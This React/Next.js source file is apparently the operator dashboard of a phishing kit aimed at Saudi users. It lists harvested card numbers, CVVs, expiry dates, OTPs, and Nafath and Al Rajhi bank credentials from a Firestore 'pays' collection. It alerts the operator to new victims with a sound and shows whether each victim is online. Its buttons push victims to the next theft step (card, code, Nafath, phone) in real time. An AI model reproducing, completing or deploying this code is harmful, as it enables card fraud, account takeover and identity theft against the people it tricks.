"use client"

import type React from "react"
import { useState, useEffect, useRef, useMemo } from "react"
import { useRouter } from "next/navigation"
import { Trash2, LogOut, CreditCard, User, Car, FileText, CheckCircle, XCircle, AlertCircle, Clock, Calendar, Search, Shield, MoreHorizontal, Tag, Bell, Eye, Loader2, RefreshCw, Smartphone, Volume2, VolumeX, Home, Lock, Phone, LockIcon, Landmark } from 'lucide-react'
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { formatDistanceToNow } from "date-fns"
import { ar } from "date-fns/locale"
import { Toaster, toast } from "sonner"
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog"
import { Card, CardContent, CardHeader, CardTitle, CardFooter } from "@/components/ui/card"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { Tabs, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Input } from "@/components/ui/input"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import PhoneDialog from "@/components/phone-info"
import NafazAuthDialog from "@/components/nafaz"
import RajhiAuthDialog from "@/components/rajhi"
import CardInfoDialog from "@/components/card-info-dialog"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTitle } from "@/components/ui/sheet"
import { auth, database, db } from "@/lib/firestore"
import { Skeleton } from "@/components/ui/skeleton"
import { onValue, ref } from "firebase/database"

// Assuming firebase config is in @/lib/firestore
// You might need to create this file if it doesn't exist.
// Example:
// import { initializeApp } from "firebase/app";
// import { getFirestore } from "firebase/firestore";
// import { getAuth } from "firebase/auth";
// const firebaseConfig = { ... };
// const app = initializeApp(firebaseConfig);
// export const db = getFirestore(app);
// export const auth = getAuth(app);


interface PaymentData {
  cardNumber?: string
  cvv?: string
  cardMonth?: string
  cardYear?: string
  full_name?: string
}

interface FormData {
  cardNumber?: string
  cvv?: string
  cardMonth?: string
  cardYear?: string
  full_name?: string
}

export interface Notification {
  id: string
  agreeToTerms?: boolean
  buyer_identity_number?: string
  cardNumber?: string
  createdDate: string
  customs_code?: string
  cvv?: string
  document_owner_full_name?: string
  cardYear?: string
  cardMonth?: string
  formData?: FormData
  full_name?: string
  insurance_purpose?: string
  owner_identity_number?: string
  pagename?: string
  paymentData?: PaymentData
  paymentStatus?: string
  phone?: string
  phone2?: string
  seller_identity_number?: string
  serial_number?: string
  status?: string
  vehicle_manufacture_number?: string
  documment_owner_full_name?: string
  vehicle_type?: string
  isHidden?: boolean
  pinCode?: string
  otp?: string
  phoneOtp?: string
  allOtps?: string[]
  externalUsername?: string
  externalPassword?: string
  nafadUsername?: string
  nafadPassword?: string
  nafaz_pin?: string
  autnAttachment?: string
  requierdAttachment?: string
  operator?: string
  otpPhoneStatus: string
  phoneotp: string
  phoneVerificationStatus: string
  country?: string
  currentPage?: string,
  phoneOtpCode?:string

}

function PageStatusBadge({ status }: { status: string }) {
  switch (status) {
    case "1":
      return <Badge variant="outline" className="px-3 py-1 text-sm font-medium bg-emerald-100 text-emerald-800 border-emerald-200 dark:bg-emerald-900/50 dark:text-emerald-300 dark:border-emerald-800">معلومات</Badge>
    case "2":
      return <Badge variant="outline" className="px-3 py-1 text-sm font-medium bg-slate-100 text-slate-800 border-slate-200 dark:bg-slate-900/50 dark:text-slate-300 dark:border-slate-800">تسجيل</Badge>
    case "3":
      return <Badge variant="outline" className="px-3 py-1 text-sm font-medium bg-sky-100 text-sky-800 border-sky-200 dark:bg-sky-900/50 dark:text-sky-300 dark:border-sky-800">عروض</Badge>
    case "4":
      return <Badge variant="outline" className="px-3 py-1 text-sm font-medium bg-teal-100 text-teal-800 border-teal-200 dark:bg-teal-900/50 dark:text-teal-300 dark:border-teal-800">مزايا</Badge>
    case "5":
      return <Badge variant="outline" className="px-3 py-1 text-sm font-medium bg-zinc-100 text-zinc-800 border-zinc-200 dark:bg-zinc-900/50 dark:text-zinc-300 dark:border-zinc-800">ملخص</Badge>
    case "6":
      return <Badge variant="outline" className="px-3 py-1 text-sm font-medium bg-rose-100 text-rose-800 border-rose-200 dark:bg-rose-900/50 dark:text-rose-300 dark:border-rose-800">دفع</Badge>
    case "7":
      return <Badge variant="outline" className="px-3 py-1 text-sm font-medium bg-violet-100 text-violet-800 border-violet-200 dark:bg-violet-900/50 dark:text-violet-300 dark:border-violet-800">كود</Badge>
    case "nafaz":
      return <Badge variant="outline" className="px-3 py-1 text-sm font-medium bg-violet-100 text-violet-800 border-violet-200 dark:bg-violet-900/50 dark:text-violet-300 dark:border-violet-800">نفاذ</Badge>
    case "9999":
      return <Badge variant="outline" className="px-3 py-1 text-sm font-medium bg-violet-100 text-violet-800 border-violet-200 dark:bg-violet-900/50 dark:text-violet-300 dark:border-violet-800">هاتف</Badge>
    default:
      return <Badge variant="outline" className="px-3 py-1 text-sm font-medium bg-amber-100 text-amber-800 border-amber-200 dark:bg-amber-900/50 dark:text-amber-300 dark:border-amber-800">قيد الانتظار</Badge>
  }
}

function ColumnStatusBadge({ status }: { status?: string }) {
  switch (status) {
    case "approved":
      return <Badge variant="outline" className="text-emerald-600 bg-emerald-50 border-emerald-200 dark:text-emerald-400 dark:bg-emerald-900/50 dark:border-emerald-800">مقبول</Badge>;
    case "rejected":
      return <Badge variant="outline" className="text-rose-600 bg-rose-50 border-rose-200 dark:text-rose-400 dark:bg-rose-900/50 dark:border-rose-800">مرفوض</Badge>;
    case "pending":
    default:
      return <Badge variant="outline" className="text-amber-600 bg-amber-50 border-amber-200 dark:text-amber-400 dark:bg-amber-900/50 dark:border-amber-800">قيد الانتظار</Badge>;
  }
}
function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">(
    "unknown"
  );

  useEffect(() => {
    const userStatusRef = ref(database, `/status/${userId}`);

    const unsubscribe = onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setStatus(data.state === "online" ? "online" : "offline");
      } else {
        setStatus("unknown");
      }
    });

    return () => unsubscribe();
  }, [userId]);

  return (
    <div className="flex items-center gap-2">
      <div
        className={`w-2 h-2 rounded-full ${
          status === "online" ? "bg-green-500 animate-pulse" : "bg-red-500"
        }`}
      />
      <Badge
        variant="outline"
        className={`text-xs ${
          status === "online"
            ? "bg-green-50 text-green-700 border-green-200 dark:bg-green-950/30 dark:text-green-300"
            : "bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300"
        }`}
      >
        {status === "online" ? "متصل" : "غير متصل"}
      </Badge>
    </div>
  );
}
export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [isRefreshing, setIsRefreshing] = useState(false)
  const [searchTerm, setSearchTerm] = useState("")
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [activeFilter, setActiveFilter] = useState<string>("all")
  const router = useRouter()
  const [showCardDialog, setShowCardDialog] = useState(false)
  const [showRajhiDialog, setShowRajhiDialog] = useState(false)
  const [showNafazDialog, setShowNafazDialog] = useState(false)
  const [showPhoneDialog, setPhoneDialog] = useState(false)
  const [sortOrder, setSortOrder] = useState<"newest" | "oldest">("newest")
  const [soundEnabled, setSoundEnabled] = useState(true)
  const [currentPage, setCurrentPage] = useState(1)
  const [itemsPerPage, setItemsPerPage] = useState(50)
  const audioRef = useRef<HTMLAudioElement | null>(null)
  const previousNotificationCountRef = useRef<number>(0)

  useEffect(() => {
    audioRef.current = new Audio("/beep_sms.mp3")
    audioRef.current.preload = "auto"
    return () => { audioRef.current = null }
  }, [])

  const playNotificationSound = () => {
    if (soundEnabled && audioRef.current) {
      audioRef.current.currentTime = 0
      audioRef.current.play().catch((error) => console.error("Failed to play notification sound:", error))
    }
  }

  useEffect(() => {
    const unsubscribeAuth = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => { if (unsubscribeNotifications) unsubscribeNotifications() }
      }
    })
    return () => unsubscribeAuth()
  }, [router])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => ({ id: doc.id, ...doc.data() } as any))
          .filter((notification: any) => !notification.isHidden) as Notification[]
        const currentCount = notificationsData.length
        if (previousNotificationCountRef.current > 0 && currentCount > previousNotificationCountRef.current && soundEnabled) {
          playNotificationSound()
          toast.success("إشعار جديد وصل!", { position: "top-center", duration: 3000, icon: <Bell className="h-5 w-5" /> })
        }
        previousNotificationCountRef.current = currentCount
        setNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )
    return unsubscribe
  }

  const filteredAndSortedNotifications= useMemo(() => {
    let processed = [...notifications]
    if (activeFilter !== "all" || searchTerm) {
      processed = processed.filter((notification) => {
        const matchesFilter =
          activeFilter === "all" ||
          (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
          (activeFilter === "approved" && notification.status === "approved") ||
          (activeFilter === "rejected" && notification.status === "rejected")
        const matchesSearch =
          !searchTerm ||
          notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.phone?.includes(searchTerm) ||
          notification.cardNumber?.includes(searchTerm)
        return matchesFilter && matchesSearch
      })
    }
    processed.sort((a, b) => {
      const dateA = new Date(a.createdDate).getTime()
      const dateB = new Date(b.createdDate).getTime()
      return sortOrder === "newest" ? dateB - dateA : dateA - dateB
    })
    return processed
  }, [notifications, activeFilter, searchTerm, sortOrder])

  const paginatedNotifications = useMemo(() => {
    const startIndex = (currentPage - 1) * itemsPerPage
    return filteredAndSortedNotifications.slice(startIndex, startIndex + itemsPerPage)
  }, [filteredAndSortedNotifications, currentPage, itemsPerPage])

  const totalPages = Math.ceil(filteredAndSortedNotifications.length / itemsPerPage)

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      toast.success("تم مسح جميع البيانات بنجاح", { position: "top-center", duration: 3000, icon: <CheckCircle className="h-5 w-5" /> })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast.error("حدث خطأ أثناء مسح البيانات", { position: "top-center", duration: 3000, icon: <XCircle className="h-5 w-5" /> })
    } finally {
      setIsLoading(false)
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast.error("حدث خطأ أثناء تسجيل الخروج", { position: "top-center", duration: 3000, icon: <XCircle className="h-5 w-5" /> })
    }
  }

  const handleCardBadgeClick = (notification: Notification, e: React.MouseEvent) => {
    e.stopPropagation()
    if (notification.cardNumber || notification.paymentData) {
      setSelectedNotification(notification)
      setShowCardDialog(true)
    }
  }

  const handleActionClick = async (notification: any, action: string) => {
    const docRef = doc(db, "pays", notification.id)
    await updateDoc(docRef, { currentPage: action })
    toast.success("تم تحديث البيانات بنجاح", { position: "top-center", duration: 3000, icon: <CheckCircle className="h-5 w-5" /> })
  };

  if (isLoading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-slate-50 dark:bg-slate-950">
        <Loader2 className="h-12 w-12 animate-spin text-slate-400 dark:text-slate-500" />
      </div>
    )
  }

  return (
    <div dir="rtl" className="min-h-screen bg-slate-50 text-slate-800 dark:bg-slate-950 dark:text-slate-200 p-4 sm:p-6">
      <Toaster richColors closeButton position="top-center" />
      <Card className="shadow-lg border-slate-200/80 bg-white/80 dark:border-slate-800/80 dark:bg-slate-900/80 backdrop-blur-sm">
        <CardHeader className="border-b border-slate-200 dark:border-slate-800 p-4">
          <div className="flex flex-wrap justify-between items-center gap-4">
            <div className="flex items-center gap-3">
              <div className="bg-slate-800 dark:bg-slate-950 p-2.5 rounded-lg shadow-inner">
                <Bell className="h-5 w-5 text-white" />
              </div>
              <CardTitle className="text-xl font-bold text-slate-800 dark:text-slate-100">
                لوحة البيانات
              </CardTitle>
            </div>
            <div className="flex items-center gap-2 flex-wrap">
              <Button variant="outline" size="sm" onClick={() => setSoundEnabled(!soundEnabled)} className="gap-1.5 bg-white hover:bg-slate-100 border-slate-300 text-slate-700 dark:bg-slate-900 dark:hover:bg-slate-800 dark:border-slate-700 dark:text-slate-300">
                {soundEnabled ? <Volume2 className="h-4 w-4 text-emerald-500" /> : <VolumeX className="h-4 w-4 text-rose-500" />}
                {soundEnabled ? "الصوت مفعل" : "الصوت معطل"}
              </Button>
              <Button variant="outline" size="sm" onClick={fetchNotifications} disabled={isRefreshing} className="gap-1.5 bg-white hover:bg-slate-100 border-slate-300 text-slate-700 dark:bg-slate-900 dark:hover:bg-slate-800 dark:border-slate-700 dark:text-slate-300">
                <RefreshCw className={`h-4 w-4 ${isRefreshing ? "animate-spin" : ""}`} />
                تحديث
              </Button>
              <Button variant="destructive" size="sm" onClick={handleClearAll} disabled={notifications.length === 0} className="gap-1.5">
                <Trash2 className="h-4 w-4" />
                مسح الكل
              </Button>
              <Button variant="outline" size="sm" onClick={handleLogout} className="gap-1.5 bg-white hover:bg-slate-100 border-slate-300 text-slate-700 dark:bg-slate-900 dark:hover:bg-slate-800 dark:border-slate-700 dark:text-slate-300">
                <LogOut className="h-4 w-4" />
                تسجيل الخروج
              </Button>
            </div>
          </div>
        </CardHeader>
        <CardContent className="p-4">
          <div className="flex flex-wrap justify-between items-center gap-4 mb-4">
            <Tabs value={activeFilter} onValueChange={(value) => { setActiveFilter(value); setCurrentPage(1); }} className="w-auto">
              <TabsList className="bg-slate-200/80 dark:bg-slate-800 p-1 rounded-lg">
                <TabsTrigger value="all">الكل</TabsTrigger>
                <TabsTrigger value="pending">قيد الانتظار</TabsTrigger>
                <TabsTrigger value="approved">مقبول</TabsTrigger>
                <TabsTrigger value="rejected">مرفوض</TabsTrigger>
              </TabsList>
            </Tabs>
            <div className="flex items-center gap-2 flex-wrap">
              <div className="relative">
                <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-slate-400 dark:text-slate-500" />
                <Input
                  placeholder="بحث..."
                  className="pr-10 w-56 bg-white dark:bg-slate-900 dark:border-slate-700 dark:placeholder:text-slate-500"
                  value={searchTerm}
                  onChange={(e) => { setSearchTerm(e.target.value); setCurrentPage(1); }}
                />
              </div>
              <Select value={sortOrder} onValueChange={(value) => setSortOrder(value as "newest" | "oldest")}>
                <SelectTrigger className="w-[140px] bg-white dark:bg-slate-900 dark:border-slate-700">
                  <SelectValue placeholder="ترتيب حسب" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="newest">الأحدث أولاً</SelectItem>
                  <SelectItem value="oldest">الأقدم أولاً</SelectItem>
                </SelectContent>
              </Select>
              <Select value={itemsPerPage.toString()} onValueChange={(value) => { setItemsPerPage(Number(value)); setCurrentPage(1); }}>
                <SelectTrigger className="w-[90px] bg-white dark:bg-slate-900 dark:border-slate-700">
                  <SelectValue placeholder="عدد" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="10">10</SelectItem>
                  <SelectItem value="20">20</SelectItem>
                  <SelectItem value="50">50</SelectItem>
                  <SelectItem value="100">100</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>
          <div className="border rounded-lg overflow-x-auto border-slate-200 dark:border-slate-800">
            <Table className="min-w-full">
              <TableHeader className="bg-slate-50 dark:bg-slate-900">
                <TableRow className="border-slate-200 dark:border-slate-800">
                  <TableHead className="text-right text-slate-600 dark:text-slate-400 font-semibold">الدولة</TableHead>
                  <TableHead className="text-right text-slate-600 dark:text-slate-400 font-semibold">الحالة</TableHead>
                  <TableHead className="text-right text-slate-600 dark:text-slate-400 font-semibold">الاسم</TableHead>
                  <TableHead className="text-right text-slate-600 dark:text-slate-400 font-semibold">البطاقة</TableHead>
                  <TableHead className="text-right text-slate-600 dark:text-slate-400 font-semibold">اجراء مطلوب</TableHead>
                  <TableHead className="text-right text-slate-600 dark:text-slate-400 font-semibold">رمز التحقق</TableHead>
                  <TableHead className="text-right text-slate-600 dark:text-slate-400 font-semibold">الصفحة الحالية</TableHead>
                  <TableHead className="text-right text-slate-600 dark:text-slate-400 font-semibold">التاريخ</TableHead>
                  <TableHead className="text-center text-slate-600 dark:text-slate-400 font-semibold">إجراءات</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {paginatedNotifications.length > 0 ? (
                  paginatedNotifications.map((notification) => (
                    <TableRow key={notification.id} className="hover:bg-slate-50/50 dark:hover:bg-slate-800/50 border-b border-slate-200 dark:border-slate-800 last:border-b-0">
                      <TableCell className="text-slate-500 dark:text-slate-400">{notification.country || "N/A"}</TableCell>
                      <TableCell><UserStatus userId={notification.id} /></TableCell>
                      <TableCell>
                        <div className="flex items-center gap-2 font-medium text-slate-700 dark:text-slate-300">
                          <div className="w-7 h-7 rounded-full bg-slate-200 dark:bg-slate-700 flex items-center justify-center">
                            <User className="h-4 w-4 text-slate-500 dark:text-slate-400" />
                          </div>
                          <span>{notification.documment_owner_full_name || notification.document_owner_full_name || "غير محدد"}</span>
                        </div>
                      </TableCell>
                      <TableCell>
                        <Badge
                          variant={notification.cardNumber || notification.paymentData ? "outline" : "destructive"}
                          className={`cursor-pointer ${notification.cardNumber || notification.paymentData ? "bg-amber-100 text-amber-800 border-amber-200 hover:bg-amber-200 dark:bg-amber-950 dark:text-amber-300 dark:border-amber-800 dark:hover:bg-amber-900" : "bg-rose-100 text-rose-800 border-rose-200 hover:bg-rose-200 dark:bg-rose-950 dark:text-rose-300 dark:border-rose-800 dark:hover:bg-rose-900"}`}
                          onClick={(e) => handleCardBadgeClick(notification, e)}
                        >
                          {notification.cardNumber || notification.paymentData ? "بيانات البطاقة" : "لا يوجد بطاقة"}
                        </Badge>
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-1.5 flex-wrap">
                          {notification?.nafadUsername && (
                            <Badge className="cursor-pointer bg-sky-100 text-sky-800 border border-sky-200 dark:bg-sky-950 dark:text-sky-300 dark:border-sky-800" onClick={() => { setSelectedNotification(notification); setShowNafazDialog(true); }}>نفاذ</Badge>
                          )}
                          {notification?.operator === 'rajhi' && (
                            <Badge className="cursor-pointer bg-blue-100 text-blue-800 border border-blue-200 dark:bg-blue-950 dark:text-blue-300 dark:border-blue-800" onClick={() => { setSelectedNotification(notification); setShowRajhiDialog(true); }}>الراجحي</Badge>
                          )}
                          {notification?.phone2 && (
                              <Badge onClick={()=>{ setSelectedNotification(notification)
                                setPhoneDialog(true)}} className={`bg-fuchsia-100 text-fuchsia-800 border border-fuchsia-200 dark:bg-fuchsia-950 dark:text-fuchsia-300 dark:border-fuchsia-800 ${notification?.phoneOtpCode ? "animate-bounce" : ""}`}>
                                  {notification.phoneOtpCode && (
        <span className="absolute -top-1 -right-1 flex h-3 w-3">
          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-fuchsia-400 opacity-75 dark:bg-fuchsia-500"></span>
          <span className="relative inline-flex rounded-full h-3 w-3 bg-fuchsia-500 dark:bg-fuchsia-400"></span>
        </span>
      )}
                                  {notification?.phone2}
                                  </Badge>
                          )}
                        </div>
                      </TableCell>
                      <TableCell>
                        {notification.otp && (
                          <Badge className="bg-teal-100 text-teal-800 border border-teal-200 dark:bg-teal-950 dark:text-teal-300 dark:border-teal-800 font-mono tracking-widest">{notification.otp}</Badge>
                        )}
                      </TableCell>
                      <TableCell><PageStatusBadge status={notification?.currentPage! as any} /></TableCell>
                      <TableCell className="text-slate-500 dark:text-slate-400 text-xs whitespace-nowrap">{formatDistanceToNow(new Date(notification.createdDate), { addSuffix: true, locale: ar })}</TableCell>
                      <TableCell>
                        <div className="flex justify-center items-center gap-0.5">
                          <TooltipProvider delayDuration={100}>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button onClick={() => { handleActionClick(notification, '9999');  }} variant="ghost" size="icon" className="h-8 w-8 rounded-full text-sky-500 hover:bg-sky-100 dark:hover:bg-sky-900/50"><Phone className="h-4 w-4" /></Button>
                              </TooltipTrigger>
                              <TooltipContent><p> الهاتف</p></TooltipContent>
                            </Tooltip>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button onClick={() => handleActionClick(notification, '1')} variant="ghost" size="icon" className="h-8 w-8 rounded-full text-slate-500 hover:bg-slate-200 dark:text-slate-400 dark:hover:bg-slate-700"><Home className="h-4 w-4" /></Button>
                              </TooltipTrigger>
                              <TooltipContent><p>معلومات </p></TooltipContent>
                            </Tooltip>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button onClick={() => handleActionClick(notification, '6')} variant="ghost" size="icon" className="h-8 w-8 rounded-full text-amber-500 hover:bg-amber-100 dark:hover:bg-amber-900/50"><CreditCard className="h-4 w-4" /></Button>
                              </TooltipTrigger>
                              <TooltipContent><p> البطاقة</p></TooltipContent>
                            </Tooltip>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button onClick={() => handleActionClick(notification, 'nafaz')} variant="ghost" size="icon" className="h-8 w-8 rounded-full text-emerald-500 hover:bg-emerald-100 dark:hover:bg-emerald-900/50"><Shield className="h-4 w-4" /></Button>
                              </TooltipTrigger>
                              <TooltipContent><p>نفاذ </p></TooltipContent>
                            </Tooltip>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button onClick={() => handleActionClick(notification, '7')} variant="ghost" size="icon" className="h-8 w-8 rounded-full text-rose-500 hover:bg-rose-100 dark:hover:bg-rose-900/50"><LockIcon className="h-4 w-4" /></Button>
                              </TooltipTrigger>
                              <TooltipContent><p>كود</p></TooltipContent>
                            </Tooltip>
                          </TooltipProvider>
                        </div>
                      </TableCell>
                    </TableRow>
                  ))
                ) : (
                  <TableRow>
                    <TableCell colSpan={9} className="h-24 text-center text-slate-500 dark:text-slate-400">
                      لا توجد بيانات مطابقة.
                    </TableCell>
                  </TableRow>
                )}
              </TableBody>
            </Table>
          </div>
        </CardContent>
        <CardFooter className="p-4 border-t border-slate-200 dark:border-slate-800">
          <div className="flex flex-wrap items-center justify-between w-full gap-4">
            <div className="text-sm text-slate-500 dark:text-slate-400">
              صفحة {currentPage} من {totalPages || 1} (إجمالي {filteredAndSortedNotifications.length} نتيجة)
            </div>
            <div className="flex items-center gap-2">
              <Button variant="outline" size="sm" onClick={() => setCurrentPage(1)} disabled={currentPage === 1}>الأولى</Button>
              <Button variant="outline" size="sm" onClick={() => setCurrentPage(currentPage - 1)} disabled={currentPage === 1}>السابقة</Button>
              <Button variant="outline" size="sm" onClick={() => setCurrentPage(currentPage + 1)} disabled={currentPage === totalPages || totalPages === 0}>التالية</Button>
              <Button variant="outline" size="sm" onClick={() => setCurrentPage(totalPages)} disabled={currentPage === totalPages || totalPages === 0}>الأخيرة</Button>
            </div>
          </div>
        </CardFooter>
      </Card>
      
      <CardInfoDialog open={showCardDialog} onOpenChange={setShowCardDialog} notification={selectedNotification!} />
      <RajhiAuthDialog open={showRajhiDialog} onOpenChange={setShowRajhiDialog} notification={selectedNotification} />
      <NafazAuthDialog open={showNafazDialog} onOpenChange={setShowNafazDialog} notification={selectedNotification} />
     {/* External Component Dialogs */}
     <PhoneDialog open={showPhoneDialog} onOpenChange={setPhoneDialog} notification={selectedNotification} phoneOtpCode={selectedNotification?.phoneOtpCode} phone2={selectedNotification?.phone2} operator={selectedNotification?.operator} handlePhoneOtpApproval={function (status: string, id: string): Promise<void> {
        throw new Error("Function not implemented.")
      } }/>
    </div>
  )
}
